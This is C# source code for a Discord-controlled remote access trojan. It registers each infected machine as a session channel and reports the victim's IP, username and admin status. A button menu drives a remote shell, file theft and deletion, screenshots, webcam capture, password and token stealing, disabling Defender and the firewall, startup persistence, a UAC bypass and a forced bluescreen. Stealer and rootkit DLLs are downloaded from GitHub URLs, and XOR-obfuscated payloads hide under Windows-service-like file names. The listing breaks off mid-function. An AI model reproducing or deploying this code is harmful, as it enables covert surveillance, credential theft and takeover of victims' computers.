using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Net.WebSockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;
using System.Windows.Forms;
namespace Discord_rat
{

   public class WsClient : IDisposable
   {

       public int ReceiveBufferSize { get; set; } = 8192;
       public Func<Stream,Task> ResponseReceived;
       public bool connected=false;
       public async Task WaitUtillDead() 
       {
           while (connected) 
           {
                await Task.Delay(1000);
           }
       }
       public async Task ConnectAsync(string url)
       {
           if (WS != null)
           {
               if (WS.State == WebSocketState.Open) return;
               else WS.Dispose();
           }
           WS = new ClientWebSocket();
           if (CTS != null) CTS.Dispose();
           CTS = new CancellationTokenSource();
           await WS.ConnectAsync(new Uri(url), CTS.Token);
           await Task.Factory.StartNew(ReceiveLoop, CTS.Token, TaskCreationOptions.LongRunning, TaskScheduler.Default);
           connected = true; 
       }

       public async Task DisconnectAsync()
       {

            if (WS is null)
            {
                connected = false; 
                return;
            }
           if (WS.State == WebSocketState.Open)
           {
               CTS.CancelAfter(TimeSpan.FromSeconds(2));
               await WS.CloseOutputAsync(WebSocketCloseStatus.Empty, "", CancellationToken.None);
               await WS.CloseAsync(WebSocketCloseStatus.NormalClosure, "", CancellationToken.None);
           }
           WS.Dispose();
           WS = null;
           CTS.Dispose();
           CTS = null;
           connected = false;
        }
       private async Task ReceiveLoop()
       {
           var loopToken = CTS.Token;
           MemoryStream outputStream = null;
           WebSocketReceiveResult receiveResult = null;
           ArraySegment<byte> buffer = new ArraySegment<byte>(new byte[ReceiveBufferSize]);
           try
           {
               while (!loopToken.IsCancellationRequested)
               {
                    Console.WriteLine("e1");
                    outputStream = new MemoryStream(ReceiveBufferSize);
                   do
                   {
                       receiveResult = await WS.ReceiveAsync(buffer, CTS.Token);
                       if (receiveResult.MessageType != WebSocketMessageType.Close)
                           outputStream.Write(buffer.ToArray(), 0, receiveResult.Count);
                   }
                   while (!receiveResult.EndOfMessage);
                    if (receiveResult.MessageType == WebSocketMessageType.Close) {
                        break;
                    };
                   outputStream.Position = 0;
                   await ResponseReceived(outputStream).ConfigureAwait(false);
                }
           }
           catch (Exception s) { Program.LogDebug("WS error: " + s); Console.WriteLine(s); }
           finally
           {
              outputStream?.Dispose();
           }
       }

       public async Task SendMessageAsync(string message)
       {
           ArraySegment<byte> bytesToSend = new ArraySegment<byte>(Encoding.UTF8.GetBytes(message));
           await WS.SendAsync(bytesToSend, WebSocketMessageType.Text, true, CancellationToken.None);
       }
       public void Dispose() => DisconnectAsync().Wait();

       private ClientWebSocket WS;
       private CancellationTokenSource CTS;

   }
    public class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);

        public const int SPI_SETDESKWALLPAPER = 20;
        public const int SPIF_UPDATEINIFILE = 1;
        public const int SPIF_SENDCHANGE = 2;
        [DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int SystemParametersInfo(
          int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("User32.dll")]
        private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

        [DllImport("Kernel32.dll")]
        private static extern uint GetLastError();
        internal struct LASTINPUTINFO
        {
            public uint cbSize;

            public uint dwTime;
        }
        public static JavaScriptSerializer serializer = new JavaScriptSerializer();
        public static WsClient client = new WsClient();
        public static string BotToken = settings.Bottoken;
        public static string GuildId = settings.Guildid;
        public static string ChannelId = "unset";
        public static string HelpMenuMessageId = null;
        public static string PayloadRoot = null;
        public static Dictionary<string, byte[]> EmbeddedModules = new Dictionary<string, byte[]>();
        private const byte PayloadXorKey = 0xA7;

        public static void LogDebug(string message)
        {
            try
            {
                string path = Path.Combine(Path.GetTempPath(), "wrprov.log");
                File.AppendAllText(path, DateTime.Now.ToString("HH:mm:ss") + " " + message + Environment.NewLine);
            }
            catch
            {
            }
        }

        private static string GetInstanceMutexName()
        {
            try
            {
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\AppReadiness"))
                {
                    string session = key?.GetValue("Session") as string;
                    if (!string.IsNullOrWhiteSpace(session))
                    {
                        return @"Global\WRProv_" + session;
                    }
                }
            }
            catch
            {
            }

            return @"Global\WRProv_default";
        }

        public static string GetPayloadPath()
        {
            string path = Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(path))
            {
                return path;
            }

            string protectedPath = Path.Combine(GetPayloadDirectory(), "ProvData.db");
            if (!File.Exists(protectedPath))
            {
                protectedPath = Path.Combine(GetPayloadDirectory(), "core.bin");
            }
            if (File.Exists(protectedPath))
            {
                return protectedPath;
            }

            var entry = Assembly.GetEntryAssembly();
            return entry != null ? entry.Location : "";
        }
        public static string GetPayloadDirectory()
        {
            if (!string.IsNullOrEmpty(PayloadRoot))
            {
                return PayloadRoot;
            }

            string path = Assembly.GetExecutingAssembly().Location;
            if (!string.IsNullOrEmpty(path))
            {
                return Path.GetDirectoryName(path);
            }

            return AppDomain.CurrentDomain.BaseDirectory;
        }
        public static string GetStartupPath()
        {
            string baseDir = GetPayloadDirectory();
            string[] candidates =
            {
                Path.Combine(baseDir, "WaaSMedicSvc.db"),
                Path.Combine(baseDir, "WaaSMedicSvc.exe"),
                Path.Combine(baseDir, "RuntimeHost.exe"),
                Path.Combine(baseDir, "Loader.exe")
            };

            foreach (string candidate in candidates)
            {
                if (File.Exists(candidate))
                {
                    return candidate;
                }
            }

            return GetPayloadPath();
        }
        public static byte[] DecodeProtectedBytes(byte[] data)
        {
            byte[] decoded = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
            {
                decoded[i] = (byte)(data[i] ^ PayloadXorKey);
            }
            return decoded;
        }
        public static byte[] ReadModuleFile(string path)
        {
            byte[] raw = File.ReadAllBytes(path);
            if (path.EndsWith(".bin", StringComparison.OrdinalIgnoreCase) ||
                path.EndsWith(".db", StringComparison.OrdinalIgnoreCase))
            {
                return DecodeProtectedBytes(raw);
            }
            return raw;
        }
        public static Dictionary<string, string> session_channel_holder = new Dictionary<string, string>();
        public static Dictionary<string, Assembly> dll_holder = new Dictionary<string, Assembly>();
        public static Dictionary<string, object> activator_holder = new Dictionary<string, object>();
        public static Dictionary<string, string> dll_url_holder = new Dictionary<string, string> {
            {"password", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/PasswordStealer.dll"},
            { "rootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll"},
            { "unrootkit","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/unrootkit.dll"},
            { "webcam","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Webcam.dll"},
            { "token","https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Token%20grabber.dll"}
        };
        public static Dictionary<object, object> ObjectToDictionary(object obb)
        {
            return JsonToDictionary(DictionaryToJson(obb));
        }
        public static Dictionary<object, object>[] ObjectToArray(object obb)
        {
            return serializer.Deserialize<Dictionary<object, object>[]>(DictionaryToJson(obb));
        }
        public static Dictionary<object, object> JsonToDictionary(string json)
        {
            return serializer.Deserialize<Dictionary<object, object>>(json);
        }
        public static string DictionaryToJson(object dict)
        {
            return serializer.Serialize(dict);
        }
        public static async Task Responsehandler(Stream inputStream)
        {
            StreamReader reader = new StreamReader(inputStream);
            var DictResult = JsonToDictionary(reader.ReadToEnd());
            Console.WriteLine(DictionaryToJson(DictResult));
            await handler(DictResult);
            inputStream.Dispose();
        }
        public static void Main(string[] args)
        {
            Start();
        }
        private static Mutex instanceMutex;

        public static void StartWithModules(byte[] tokenBytes, byte[] mediaBytes)
        {
            if (tokenBytes != null && tokenBytes.Length > 0)
            {
                EmbeddedModules["token"] = tokenBytes;
            }

            if (mediaBytes != null && mediaBytes.Length > 0)
            {
                EmbeddedModules["webcam"] = mediaBytes;
            }

            Start();
        }

        public static void Start()
        {
            string mutexName = GetInstanceMutexName();
            try
            {
                instanceMutex = new Mutex(false, mutexName);
                try
                {
                    if (!instanceMutex.WaitOne(0))
                    {
                        LogDebug("Mutex already held, exiting Start()");
                        return;
                    }
                }
                catch (AbandonedMutexException)
                {
                    LogDebug("Recovered abandoned mutex, starting payload");
                }
            }
            catch (Exception ex)
            {
                LogDebug("Mutex error: " + ex.Message);
                return;
            }

            LogDebug("Start() running on " + Environment.UserName);
            MainAsync().GetAwaiter().GetResult();
        }
        public static async Task MainAsync()
        {
            try
            {
                System.Net.ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls12 | System.Net.SecurityProtocolType.Tls11 | System.Net.SecurityProtocolType.Tls;
                LogDebug("Connecting gateway...");
                client.ResponseReceived = Responsehandler;
                await client.ConnectAsync("wss://gateway.discord.gg/?v=10&encoding=json");
                LogDebug("Gateway connected, waiting...");
                await client.WaitUtillDead();
            }
            catch (Exception ex)
            {
                LogDebug("MainAsync failed: " + ex);
            }
        }
        public static async Task heartbeat(int milliseconds)
        {
            while (client.connected)
            {
                await Task.Delay(milliseconds);
                var data = new Dictionary<object, object> { { "op", 1 }, { "d", 5 } };
                var text = DictionaryToJson(data);
                Console.WriteLine(text);
                await client.SendMessageAsync(text);
            }
        }
        public static async Task login(string token)
        {
            int intent = 32767;
            var data = new Dictionary<object, object> { { "op", 2 }, { "d", new Dictionary<object, object> { { "token", token }, { "intents", intent }, { "properties", new Dictionary<object, object> { { "os", "linux" }, { "browser", "chrome" }, { "device", "chrome" } } } } } };
            string text = DictionaryToJson(data);
            Console.WriteLine(text);
            await client.SendMessageAsync(text);
        }
        public static async Task<string> CreateHostingChannel(Dictionary<object, object> data)
        {
            var guilds_id = ObjectToDictionary(data["d"])["id"];
            var channels = ObjectToDictionary(data["d"])["channels"];
            int biggest = 1;
            string fallbackChannelId = null;

            foreach (Dictionary<object, object> dict in ObjectToArray(channels))
            {
                if ((int)dict["type"] == 0)
                {
                    if (fallbackChannelId == null)
                    {
                        fallbackChannelId = dict["id"].ToString();
                    }

                    if (((string)dict["name"]).StartsWith("session-"))
                    {
                        session_channel_holder[(string)dict["name"]] = dict["id"].ToString();
                        var g = int.Parse(string.Join("", ((string)dict["name"]).ToCharArray().Where(Char.IsDigit)));
                        if (g >= biggest)
                        {
                            biggest = g + 1;
                        }
                    }
                }
            }

            string sessionName = "session-" + biggest.ToString();
            string channelId = null;

            try
            {
                string url = string.Format("https://discord.com/api/v10/guilds/{0}/channels", (string)guilds_id);
                var payload = new Dictionary<object, object> { { "name", sessionName }, { "type", 0 } };
                var textpayload = DictionaryToJson(payload);
                HttpClient httpClient = new HttpClient();
                httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
                var content = new StringContent(textpayload, Encoding.UTF8, "application/json");
                var result = await httpClient.PostAsync(url, content);
                var response = await result.Content.ReadAsStringAsync();
                if (!result.IsSuccessStatusCode)
                {
                    LogDebug("Create channel failed: " + (int)result.StatusCode + " " + response);
                    throw new Exception("Channel create failed: " + response);
                }

                var newdict = JsonToDictionary(response);
                channelId = newdict["id"].ToString();
                httpClient.Dispose();
            }
            catch (Exception ex)
            {
                LogDebug("CreateHostingChannel fallback: " + ex.Message);
                channelId = fallbackChannelId;
                sessionName = "fallback";
            }

            if (string.IsNullOrEmpty(channelId))
            {
                LogDebug("No channel available for session");
                return null;
            }

            string starting_payload = string.Format("@here :white_check_mark: New session opened {0} | User: {2} | IP: {1} | Admin: {3}", sessionName, await getip(), Environment.UserName, (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)).ToString());
            await Send_message(channelId, starting_payload);
            HelpMenuMessageId = null;
            await helpmenu(channelId);
            LogDebug("Session opened on channel " + channelId);
            return channelId;
        }
        public static async Task handler(Dictionary<object, object> data)
        {
            switch (data["op"])
            {
                case 10:
                    await login(BotToken);
                    LogDebug("Gateway hello, logged in");
                    _ = Task.Run(async () => await heartbeat((int)ObjectToDictionary(data["d"])["heartbeat_interval"]));
                    break;
                case 11:
                    Console.WriteLine("recived heartbeat");
                    break;
                case 0:
                    switch (data["t"])
                    {
                        case "READY":
                            var user = ObjectToDictionary(ObjectToDictionary(data["d"])["user"]);
                            Console.WriteLine(user["username"] + "#" + user["discriminator"]);
                            break;
                        case "GUILD_CREATE":
                            var guilds_id = ObjectToDictionary(data["d"])["id"];
                            if ((string)guilds_id == GuildId)
                            {
                                var main_channel_id = await CreateHostingChannel(data);
                                if (!string.IsNullOrEmpty(main_channel_id))
                                {
                                    ChannelId = main_channel_id;
                                }
                            }
                            break;
                        case "MESSAGE_CREATE":
                            var d = ObjectToDictionary(data["d"]);
                            var guild_id = d["guild_id"];
                            var channel_id = d["channel_id"];
                            var message_content = d["content"];
                            var bot = false;
                            List<string> tempList = new List<string>();
                            string[] attachment_urls;
                            var attachments = d["attachments"];
                            foreach (Dictionary<object, object> dict in ObjectToArray(attachments))
                            {
                                tempList.Add((string)dict["url"]);
                            }
                            attachment_urls = tempList.ToArray();
                            if (ObjectToDictionary(d["author"]).ContainsKey("bot")) bot = (bool)ObjectToDictionary(d["author"])["bot"];
                            if ((string)guild_id == GuildId && (string)channel_id == ChannelId && !bot)
                            {
                                await CommandHandler((string)message_content, attachment_urls);
                            }
                            break;
                        case "CHANNEL_CREATE":
                            d = ObjectToDictionary(data["d"]);
                            if ((string)d["guild_id"] == GuildId)
                            {
                                if (((string)d["name"]).StartsWith("session-"))
                                {
                                    session_channel_holder[(string)d["name"]] = d["id"].ToString();
                                }

                            }
                            break;
                        case "CHANNEL_DELETE":
                            d = ObjectToDictionary(data["d"]);
                            if ((string)d["id"] == ChannelId && ChannelId != "unset")
                            {
                                Application.Exit();
                                Environment.Exit(0);
                            }
                            break;
                        case "INTERACTION_CREATE":
                            d = ObjectToDictionary(data["d"]);
                            var interaction_type = (int)d["type"];
                            if (interaction_type == 3) // Message Component
                            {
                                var interaction_data = ObjectToDictionary(d["data"]);
                                var custom_id = (string)interaction_data["custom_id"];
                                var interaction_id = (string)d["id"];
                                var interaction_token = (string)d["token"];
                                var menu_message_id = ObjectToDictionary(d["message"])["id"].ToString();

                                await HandleButtonInteraction(custom_id, interaction_id, interaction_token, (string)d["channel_id"], menu_message_id);
                            }
                            else if (interaction_type == 5) // Modal Submit
                            {
                                var interaction_data = ObjectToDictionary(d["data"]);
                                await HandleModalSubmit(interaction_data, (string)d["id"], (string)d["token"], (string)d["channel_id"]);
                            }
                            break;
                    }
                    break;
            }


        }

        public static async Task HandleButtonInteraction(string custom_id, string interaction_id, string interaction_token, string channel_id, string menu_message_id)
        {
            if (!string.IsNullOrEmpty(menu_message_id))
            {
                HelpMenuMessageId = menu_message_id;
            }

            if (custom_id.StartsWith("modal_"))
            {
                await ShowParameterModal(custom_id.Substring(6), interaction_id, interaction_token);
                return;
            }

            if (custom_id.StartsWith("cmd_"))
            {
                await DeferInteractionUpdate(interaction_id, interaction_token);
                string command = custom_id.Substring(4);
                await ExecuteButtonCommand(command, channel_id);
                return;
            }

            string content;
            Dictionary<string, string> buttons;
            if (custom_id == "back_main")
            {
                content = GetMainMenuText();
                buttons = GetMainMenuButtons();
            }
            else
            {
                content = GetCategoryText(custom_id);
                buttons = GetCategoryButtons(custom_id);
            }

            await RespondInteractionUpdate(interaction_id, interaction_token, content, buttons);
        }

        public static Dictionary<object, object> BuildModalTextInput(string customId, string label, string placeholder, bool paragraph)
        {
            if (label.Length > 45)
            {
                label = label.Substring(0, 45);
            }

            return new Dictionary<object, object>
            {
                {"type", 4},
                {"custom_id", customId},
                {"label", label},
                {"style", paragraph ? 2 : 1},
                {"placeholder", placeholder},
                {"required", true},
                {"max_length", paragraph ? 2000 : 500}
            };
        }

        public static async Task RespondInteractionModal(string interaction_id, string interaction_token, string submitId, string title, Dictionary<object, object> textInput)
        {
            if (title.Length > 45)
            {
                title = title.Substring(0, 45);
            }

            string url = string.Format("https://discord.com/api/v9/interactions/{0}/{1}/callback", interaction_id, interaction_token);
            var payload = new Dictionary<object, object>
            {
                {"type", 9},
                {"data", new Dictionary<object, object>
                    {
                        {"custom_id", submitId},
                        {"title", title},
                        {"components", new List<Dictionary<object, object>>
                            {
                                new Dictionary<object, object>
                                {
                                    {"type", 1},
                                    {"components", new List<Dictionary<object, object>> { textInput }}
                                }
                            }
                        }
                    }
                }
            };
            await PostInteractionCallback(url, payload);
        }

        public static async Task RespondEphemeral(string interaction_id, string interaction_token, string message)
        {
            string url = string.Format("https://discord.com/api/v9/interactions/{0}/{1}/callback", interaction_id, interaction_token);
            var payload = new Dictionary<object, object>
            {
                {"type", 4},
                {"data", new Dictionary<object, object>
                    {
                        {"content", message},
                        {"flags", 64}
                    }
                }
            };
            await PostInteractionCallback(url, payload);
        }

        public static async Task ShowParameterModal(string command, string interaction_id, string interaction_token)
        {
            switch (command)
            {
                case "shell":
                    await RespondInteractionModal(interaction_id, interaction_token, "submit_shell", "Shell Command",
                        BuildModalTextInput("value", "Command", "whoami", false));
                    break;
                case "download":
                    await RespondInteractionModal(interaction_id, interaction_token, "submit_download", "Download File",
                        BuildModalTextInput("value", "File Path", "C:\\Users\\Desktop\\file.txt", false));
                    break;
                case "delete":
                    await RespondInteractionModal(interaction_id, interaction_token, "submit_delete", "Delete File",
                        BuildModalTextInput("value", "File Path", "C:\\path\\file.txt", false));
                    break;
                case "cd":
                    await RespondInteractionModal(interaction_id, interaction_token, "submit_cd", "Change Directory",
                        BuildModalTextInput("value", "Directory", "C:\\Users", false));
                    break;
                case "write":
                    await RespondInteractionModal(interaction_id, interaction_token, "submit_write", "Type Text",
                        BuildModalTextInput("value", "Text", "Hello", false));
                    break;
                case "message":
                    await RespondInteractionModal(interaction_id, interaction_token, "submit_message", "Show Message",
                        BuildModalTextInput("value", "Message", "Hello", true));
                    break;
                case "voice":
                    await RespondInteractionModal(interaction_id, interaction_token, "submit_voice", "Text To Speech",
                        BuildModalTextInput("value", "Text", "Hello", true));
                    break;
                case "website":
                    await RespondInteractionModal(interaction_id, interaction_token, "submit_website", "Open Website",
                        BuildModalTextInput("value", "URL", "https://google.com", false));
                    break;
                case "kill":
                    await RespondInteractionModal(interaction_id, interaction_token, "submit_kill", "Kill Process",
                        BuildModalTextInput("value", "PID", "1234", false));
                    break;
                case "prockill":
                    await RespondInteractionModal(interaction_id, interaction_token, "submit_prockill", "Kill By Name",
                        BuildModalTextInput("value", "Process Name", "notepad.exe", false));
                    break;
            }
        }

        public static string ExtractModalInput(Dictionary<object, object> data)
        {
            foreach (Dictionary<object, object> row in ObjectToArray(data["components"]))
            {
                foreach (Dictionary<object, object> comp in ObjectToArray(row["components"]))
                {
                    if ((int)comp["type"] == 4 && comp.ContainsKey("value"))
                    {
                        return ((string)comp["value"]).Trim();
                    }
                }
            }
            return "";
        }

        public static async Task HandleModalSubmit(Dictionary<object, object> data, string interaction_id, string interaction_token, string channel_id)
        {
            string submitId = (string)data["custom_id"];
            string value = ExtractModalInput(data);
            if (string.IsNullOrWhiteSpace(value))
            {
                await RespondEphemeral(interaction_id, interaction_token, "Value cannot be empty.");
                return;
            }

            await RespondEphemeral(interaction_id, interaction_token, "Executing...");

            switch (submitId)
            {
                case "submit_shell":
                    await Task.Factory.StartNew(() => ShellCommand(value, channel_id));
                    break;
                case "submit_download":
                    await upload(channel_id, value);
                    break;
                case "submit_delete":
                    try
                    {
                        File.Delete(value);
                        await Send_message(channel_id, "File deleted.");
                    }
                    catch
                    {
                        await Send_message(channel_id, "Error deleting file.");
                    }
                    break;
                case "submit_cd":
                    try
                    {
                        Directory.SetCurrentDirectory(value);
                        await Send_message(channel_id, "Directory changed to: " + Directory.GetCurrentDirectory());
                    }
                    catch
                    {
                        await Send_message(channel_id, "Error changing directory.");
                    }
                    break;
                case "submit_write":
                    SendKeys.SendWait(value);
                    await Send_message(channel_id, "Text sent to active window.");
                    break;
                case "submit_message":
                    MessageBox.Show(value);
                    await Send_message(channel_id, "Message shown.");
                    break;
                case "submit_voice":
                    await Speak(channel_id, value);
                    break;
                case "submit_website":
                    try
                    {
                        string site = value;
                        if (!site.StartsWith("http://", StringComparison.OrdinalIgnoreCase) && !site.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                        {
                            site = "https://" + site;
                        }
                        Process.Start(site);
                        await Send_message(channel_id, "Website opened.");
                    }
                    catch
                    {
                        await Send_message(channel_id, "Error opening website.");
                    }
                    break;
                case "submit_kill":
                    try
                    {
                        Process.GetProcessById(int.Parse(value)).Kill();
                        await Send_message(channel_id, "Process killed.");
                    }
                    catch
                    {
                        await Send_message(channel_id, "Error killing process.");
                    }
                    break;
                case "submit_prockill":
                    await ProcKill(channel_id, value);
                    break;
            }
        }

        public static async Task DeferInteractionUpdate(string interaction_id, string interaction_token)
        {
            string url = string.Format("https://discord.com/api/v9/interactions/{0}/{1}/callback", interaction_id, interaction_token);
            var payload = new Dictionary<object, object> { { "type", 6 } };
            await PostInteractionCallback(url, payload);
        }

        public static async Task RespondInteractionUpdate(string interaction_id, string interaction_token, string message, Dictionary<string, string> buttons)
        {
            string url = string.Format("https://discord.com/api/v9/interactions/{0}/{1}/callback", interaction_id, interaction_token);
            var payload = new Dictionary<object, object>
            {
                {"type", 7},
                {"data", new Dictionary<object, object>
                    {
                        {"content", message},
                        {"components", BuildButtonComponents(buttons)}
                    }
                }
            };
            await PostInteractionCallback(url, payload);
        }

        public static async Task PostInteractionCallback(string url, Dictionary<object, object> payload)
        {
            var textpayload = DictionaryToJson(payload);
            HttpClient httpClient = new HttpClient();
            httpClient.DefaultRequestHeaders.Add("authorization", "Bot " + BotToken);
            var content = new StringContent(textpayload, Encoding.UTF8, "application/json");
            try
            {
                await httpClient.PostAsync(url, content);
            }
            catch { }
            httpClient.Dispose();
        }

        public static List<Dictionary<object, object>> BuildButtonComponents(Dictionary<string, string> buttons)
        {
            var components = new List<Dictionary<object, object>>();
            var buttonEntries = new List<KeyValuePair<string, string>>(buttons);

            for (int i = 0; i < buttonEntries.Count; i += 5)
            {
                var actionRow = new Dictionary<object, object>
                {
                    {"type", 1},
                    {"components", new List<Dictionary<object, object>>()}
                };

                var buttonList = (List<Dictionary<object, object>>)actionRow["components"];

                for (int j = i; j < Math.Min(i + 5, buttonEntries.Count); j++)
                {
                    var button = buttonEntries[j];
                    string label = button.Value;
                    if (label.Length > 80)
                    {
                        label = label.Substring(0, 80);
                    }

                    buttonList.Add(new Dictionary<object, object>
                    {
                        {"type", 2},
                        {"style", 1},
                        {"label", label},
                        {"custom_id", button.Key}
                    });
                }

                components.Add(actionRow);
            }

            return components;
        }

        public static string GetMainMenuText()
        {
            return "**RAT Control Panel**\nSelect a category. This menu stays here - use Back to return.";
        }

        public static Dictionary<string, string> GetMainMenuButtons()
        {
            return new Dictionary<string, string>
            {
                {"system_info", "System Info"},
                {"file_ops", "File Operations"},
                {"remote_control", "Remote Control"},
                {"security", "Security"},
                {"media", "Media"},
                {"advanced", "Advanced"},
                {"session", "Session"}
            };
        }

        public static string GetCategoryText(string category)
        {
            switch (category)
            {
                case "system_info":
                    return "**System Info**\nAll buttons run instantly.";
                case "file_ops":
                    return "**File Operations**\nForm buttons open input popup.\nUpload still needs: `!upload path` + attach file";
                case "remote_control":
                    return "**Remote Control**\nForm buttons: Shell, Type Text";
                case "security":
                    return "**Security**\nAll buttons run instantly.";
                case "media":
                    return "**Media**\nForm button: Text To Speech\nAttach: `!audio` `!wallpaper` + file";
                case "advanced":
                    return "**Advanced**\nForm buttons: Shell, Website, Kill PID, Kill Process";
                case "session":
                    return "**Session**\nForm button: Show Message Box";
                default:
                    return GetMainMenuText();
            }
        }

        public static Dictionary<string, string> GetCategoryButtons(string category)
        {
            switch (category)
            {
                case "system_info":
                    return new Dictionary<string, string>
                    {
                        {"cmd_admincheck", "Admin Check"},
                        {"cmd_datetime", "Date & Time"},
                        {"cmd_currentdir", "Current Directory"},
                        {"cmd_idletime", "Idle Time"},
                        {"cmd_listprocess", "List Processes"},
                        {"cmd_geolocate", "Geolocate"},
                        {"back_main", "Back"}
                    };
                case "file_ops":
                    return new Dictionary<string, string>
                    {
                        {"cmd_dir", "List Directory"},
                        {"cmd_currentdir", "Current Directory"},
                        {"modal_download", "Download File"},
                        {"modal_delete", "Delete File"},
                        {"modal_cd", "Change Directory"},
                        {"back_main", "Back"}
                    };
                case "remote_control":
                    return new Dictionary<string, string>
                    {
                        {"cmd_screenshot", "Screenshot"},
                        {"cmd_clipboard", "Get Clipboard"},
                        {"modal_shell", "Shell Command"},
                        {"modal_write", "Type Text"},
                        {"cmd_block", "Block Input"},
                        {"cmd_unblock", "Unblock Input"},
                        {"back_main", "Back"}
                    };
                case "security":
                    return new Dictionary<string, string>
                    {
                        {"cmd_password", "Steal Passwords"},
                        {"cmd_grabtokens", "Grab Tokens"},
                        {"cmd_disabledefender", "Disable Defender"},
                        {"cmd_disablefirewall", "Disable Firewall"},
                        {"cmd_startup", "Add to Startup"},
                        {"back_main", "Back"}
                    };
                case "media":
                    return new Dictionary<string, string>
                    {
                        {"cmd_webcampic", "Webcam Photo"},
                        {"cmd_getcams", "List Cameras"},
                        {"modal_voice", "Text To Speech"},
                        {"back_main", "Back"}
                    };
                case "advanced":
                    return new Dictionary<string, string>
                    {
                        {"modal_shell", "Shell Command"},
                        {"modal_website", "Open Website"},
                        {"modal_kill", "Kill PID"},
                        {"modal_prockill", "Kill Process"},
                        {"cmd_uacbypass", "UAC Bypass"},
                        {"cmd_critproc", "Critical Process"},
                        {"cmd_uncritproc", "Uncritical Process"},
                        {"back_main", "Back"}
                    };
                case "session":
                    return new Dictionary<string, string>
                    {
                        {"modal_message", "Show Message"},
                        {"cmd_shutdown", "Shutdown"},
                        {"cmd_restart", "Restart"},
                        {"cmd_logoff", "Log Off"},
                        {"cmd_bluescreen", "Blue Screen"},
                        {"cmd_exit", "Exit Program"},
                        {"back_main", "Back"}
                    };
                default:
                    return GetMainMenuButtons();
            }
        }

        public static async Task ExecuteButtonCommand(string command, string channel_id)
        {
            switch (command)
            {
                case "admincheck":
                    await Send_message(channel_id, new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString());
                    break;
                case "datetime":
                    await Send_message(channel_id, DateTime.Now.ToString(@"MM\/dd\/yyyy h\:mm tt"));
                    break;
                case "currentdir":
                    await Send_message(channel_id, Directory.GetCurrentDirectory());
                    break;
                case "idletime":
                    await Send_message(channel_id, (GetIdleTime()/1000).ToString() + " seconds");
                    break;
                case "listprocess":
                    await getprocs(channel_id);
                    break;
                case "dir":
                    await dir(channel_id);
                    break;
                case "screenshot":
                    await GetScreenshot(channel_id);
                    break;
                case "clipboard":
                    await GetClipboard(channel_id);
                    break;
                case "password":
                    await sendpassword(channel_id);
                    break;
                case "grabtokens":
                    await get_tokens(channel_id);
                    break;
                case "webcampic":
                    await webcampic(channel_id);
                    break;
                case "getcams":
                    await get_cams(channel_id);
                    break;
                case "shutdown":
                    Process.Start("shutdown", "/s /t 0");
                    await Send_message(channel_id, "Shutting down...");
                    break;
                case "restart":
                    Process.Start("shutdown", "/r /t 0");
                    await Send_message(channel_id, "Restarting...");
                    break;
                case "logoff":
                    Process.Start("shutdown", "/L");
                    await Send_message(channel_id, "Logging off...");
                    break;
                case "bluescreen":
                    Bluescreen();
                    break;
                case "exit":
                    Application.Exit();
                    Environment.Exit(0);
                    break;
                case "geolocate":
                    await Send_message(channel_id, await geolocate());
                    break;
                case "startup":
                    await Send_message(channel_id, AddToStartup());
                    break;
                case "disabledefender":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await DisableDefender(channel_id);
                    }
                    else
                    {
                        await Send_message(channel_id, "Admin rights required!");
                    }
                    break;
                case "disablefirewall":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await DisableFirewall(channel_id);
                    }
                    else
                    {
                        await Send_message(channel_id, "Admin rights required!");
                    }
                    break;
                case "rootkit":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await Rootkit(channel_id);
                    }
                    else
                    {
                        await Send_message(channel_id, "Admin rights required!");
                    }
                    break;
                case "unrootkit":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        await UnRootkit(channel_id);
                    }
                    else
                    {
                        await Send_message(channel_id, "Admin rights required!");
                    }
                    break;
                case "uacbypass":
                    await uacbypass(GetPayloadPath(), channel_id);
                    break;
                case "critproc":
                    if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
                    {
                        critproc();
                        await Send_message(channel_id, "Process set as critical!");
                    }
                    else
                    {
